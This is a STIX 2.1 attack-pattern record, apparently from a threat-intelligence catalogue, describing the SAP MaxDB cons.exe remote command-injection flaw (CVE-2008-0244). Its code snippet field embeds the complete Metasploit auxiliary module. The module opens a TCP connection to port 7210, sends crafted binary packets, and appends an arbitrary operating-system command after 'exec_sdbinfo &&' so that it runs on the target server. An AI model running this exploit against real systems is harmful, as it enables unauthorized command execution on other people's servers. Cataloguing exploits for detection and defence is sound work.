{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8cd7d946-332f-416e-b0ac-f374c3518023",
    "created": "2024-08-14T16:22:20.529511Z",
    "modified": "2024-08-14T16:22:20.529515Z",
    "name": "SAP MaxDB cons.exe Remote Command Injection",
    "description": " SAP MaxDB is prone to a remote command-injection vulnerability because the application fails to properly sanitize user-supplied input. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/maxdb/maxdb_cons_exec.rb",
            "external_id": "maxdb_cons_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-0244"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SAP MaxDB cons.exe Remote Command Injection',\n      'Description'    => %q{\n          SAP MaxDB is prone to a remote command-injection vulnerability\n          because the application fails to properly sanitize user-supplied input.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '40210' ],\n          ['BID', '27206'],\n          ['CVE', '2008-0244'],\n        ],\n      'DisclosureDate' => '2008-01-09'))\n\n      register_options(\n        [\n          Opt::RPORT(7210),\n          OptString.new('CMD', [ false, 'The OS command to execute', 'hostname']),\n        ])\n  end\n\n  def run\n    connect\n\n    # Grab the MaxDB info.\n    pdbmsrv =  \"\\x5A\\x00\\x00\\x00\\x03\\x5B\\x00\\x00\\x01\\x00\\x00\\x00\\xFF\\xFF\\xFF\\xFF\"\n    pdbmsrv << \"\\x00\\x00\\x04\\x00\\x5A\\x00\\x00\\x00\\x00\\x02\\x42\\x00\\x04\\x09\\x00\\x00\"\n    pdbmsrv << \"\\x00\\x40\\x00\\x00\\xD0\\x3F\\x00\\x00\\x00\\x40\\x00\\x00\\x70\\x00\\x00\\x00\"\n    pdbmsrv << \"\\x00\\x07\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\"\n    pdbmsrv << \"\\x07\\x49\\x33\\x34\\x33\\x32\\x00\\x04\\x50\\x1C\\x2A\\x03\\x52\\x01\\x03\\x72\"\n    pdbmsrv << \"\\x01\\x09\\x70\\x64\\x62\\x6D\\x73\\x72\\x76\\x00\"\n\n    db_version =  \"\\x28\\x00\\x00\\x00\\x03\\x3f\\x00\\x00\\x01\\x00\\x00\\x00\\xc0\\x0b\\x00\\x00\"\n    db_version << \"\\x00\\x00\\x04\\x00\\x28\\x00\\x00\\x00\\x64\\x62\\x6d\\x5f\\x76\\x65\\x72\\x73\"\n    db_version << \"\\x69\\x6f\\x6e\\x20\\x20\\x20\\x20\\x20\"\n\n    sock.put(pdbmsrv)\n    sock.get_once\n    sock.put(db_version)\n\n    ver = sock.get_once || ''\n\n    info = ver[27,2000]\n    if (info.length > 0)\n      print_status(info)\n    end\n\n    # Send our command.\n    len = 39 + datastore['CMD'].length\n\n    data =  len.chr + \"\\x00\\x00\\x00\\x03\\x3F\\x00\\x00\\x01\\x00\\x00\\x00\\x54\\x0D\\x00\\x00\"\n    data << \"\\x00\\x00\\x04\\x00\" + len.chr + \"\\x00\\x00\\x00\\x65\\x78\\x65\\x63\\x5F\\x73\\x64\"\n    data << \"\\x62\\x69\\x6E\\x66\\x6F\\x20\\x26\\x26\" + \"#{datastore['CMD']}\"\n\n    sock.put(data)\n\n    res = sock.get_once\n    print_line(res)\n\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-01-09"
}